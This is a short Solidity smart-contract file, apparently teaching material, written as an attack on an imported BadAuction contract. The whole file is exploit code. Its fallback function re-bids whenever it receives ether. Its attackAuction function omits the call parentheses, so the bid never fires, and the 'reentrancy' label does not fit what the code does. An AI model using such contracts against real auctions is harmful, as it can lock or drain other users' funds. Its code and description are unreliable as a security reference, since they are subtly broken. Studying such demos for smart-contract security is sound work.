pragma solidity ^0.4.25;

import './BadAuction.sol';

/**
@title Auction reentrancy attack
@author Ahmed Ali <ahmedaabdulwahed@gmail.com>
This contract meant to be a reentrancy attack for
the auction contract
**/

contract AttackBadAuction {
    BadAuction private auction;

    event Balance(uint256 value);
    event Balance2(uint256 value);

    constructor(address _badAuctionAddress) public {
        // create new instance of the contract
        require(_badAuctionAddress != address(0), 'invalid auction contract address');
        auction = BadAuction(_badAuctionAddress);
    }

    function getBalance() public {
        emit Balance(address(this).balance);
    }

    function () public payable{
        emit Balance2(1);
        auction.bid.value(msg.value)();
    }

    function attackAuction() public payable{
        auction.bid.value(msg.value);
        emit Balance(address(this).balance);
    }
}